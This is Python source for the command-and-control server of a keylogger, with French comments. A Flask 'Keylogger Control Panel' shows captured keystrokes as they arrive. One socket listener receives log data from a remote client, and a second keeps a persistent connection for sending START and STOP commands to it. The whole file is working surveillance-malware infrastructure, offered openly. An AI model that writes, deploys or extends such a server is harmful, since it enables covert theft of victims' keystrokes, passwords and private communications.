import socket
import threading
import os
from flask import Flask, render_template_string, redirect, request
import subprocess

# --- CONFIG ---
HOST = "0.0.0.0"
SOCKET_PORT = 12345      # Réception du keylogger (LOGS)
WEB_PORT = 8080          # Serveur web
COMMAND_PORT = 12346     # Port pour les commandes
LOG_FILE = "logs.jsonl"

# --- INITIALISATION ---
app = Flask(__name__)
keylogger_process = None
conn_client_cmd = None  # Connexion persistante pour les commandes

# ============================================================
#   PAGE HTML
# ============================================================
PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Keylogger Control Panel</title>
    <style>
        body { font-family: Arial; background: #eef1f5; margin: 0; padding: 0; }
        .container {
            width: 80%; max-width: 900px; margin: 40px auto;
            background: white; padding: 30px; border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .button-group { display: flex; justify-content: center; gap: 15px; }
        button {
            padding: 12px 20px; font-size: 16px; border: none;
            border-radius: 8px; cursor: pointer; font-weight: bold;
            transition: background-color 0.2s ease;
        }
        .start-btn { background: #4caf50; color: white; }
        .start-btn:hover { background: #66d268; }

        .stop-btn { background: #f44336; color: white; }
        .stop-btn:hover { background: #ff6b5c; }

        .clean-btn { background: #2196f3; color: white; }
        .clean-btn:hover { background: #4fb3ff; }

        pre {
            background: #1e1e1e; color: #eee; padding: 15px;
            border-radius: 10px; max-height: 500px; overflow-y: auto;
        }
        .msg {
            background: #d5f5d5; padding: 10px;
            border-left: 5px solid #4caf50;
            margin-bottom: 20px; border-radius: 8px;
        }
    </style>
</head>
<body>

<div class="container">

    <h2>Keylogger Control Panel</h2>

    {% if message %}
    <div class="msg">{{ message }}</div>
    {% endif %}

    <div class="button-group">
        <form action="/start" method="post"><button class="start-btn">Start</button></form>
        <form action="/stop" method="post"><button class="stop-btn">Stop</button></form>
        <form action="/clean" method="post"><button class="clean-btn">Clean</button></form>
    </div>

    <h3>Logs :</h3>
    <pre id="logbox">{{ logs }}</pre>

</div>

<script>
setInterval(() => {
    fetch("/logs").then(r => r.text()).then(t => {
        document.getElementById("logbox").innerText = t;
    });
}, 600);
</script>

</body>
</html>
"""

# ============================================================
#   SOCKET COMMAND SERVER
# ============================================================
def command_server():
    global conn_client_cmd
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, COMMAND_PORT))
        s.listen()
        print(f"[CMD_SERVER] Listening on port {COMMAND_PORT} for commands...")

        conn, addr = s.accept()
        conn_client_cmd = conn
        print(f"[CMD_SERVER] Client de commandes connecté depuis {addr}")

        while True:
            threading.Event().wait(1)

# ============================================================
#   SOCKET LOG SERVER
# ============================================================
def socket_server():
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, SOCKET_PORT))
        s.listen()
        print(f"[SOCKET] Listening on port {SOCKET_PORT}...")

        while True:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(100000).decode("utf-8")
                if data.startswith("LOG_START:"):
                    log_content = data.replace("LOG_START:", "")
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(log_content + "\n")

# ============================================================
#   FLASK ROUTES
# ============================================================

@app.get("/")
def index():
    msg = request.args.get("msg", "")
    logs = ""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            logs = f.read()
    return render_template_string(PAGE, logs=logs, message=msg)


@app.get("/logs")
def get_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            return f.read()
    return ""

@app.post("/start")
def start_keylogger():
    global conn_client_cmd
    msg = "Keylogger activé"
    if conn_client_cmd:
        try:
            conn_client_cmd.sendall(b"START")
            print("[WEB] Commande START envoyée.")
        except:
            msg = "Erreur: Client déconnecté."
    else:
        msg = "Erreur: Aucun client connecté."
    return redirect(f"/?msg={msg.replace(' ', '+')}")

@app.post("/stop")
def stop_keylogger():
    global conn_client_cmd
    msg = "Keylogger arrêté"
    if conn_client_cmd:
        try:
            conn_client_cmd.sendall(b"STOP")
            print("[WEB] Commande STOP envoyée.")
        except:
            msg = "Erreur: Client déconnecté."
    else:
        msg = "Erreur: Aucun client connecté."
    return redirect(f"/?msg={msg.replace(' ', '+')}")

@app.post("/clean")
def clean_logs():
    open(LOG_FILE, "w").close()
    print("[WEB] Logs cleaned")
    return redirect("/?msg=Logs+effacés")

# ============================================================
#   MAIN
# ============================================================
if __name__ == "__main__":
    threading.Thread(target=socket_server, daemon=True).start()
    threading.Thread(target=command_server, daemon=True).start()
    app.run(host="0.0.0.0", port=WEB_PORT)
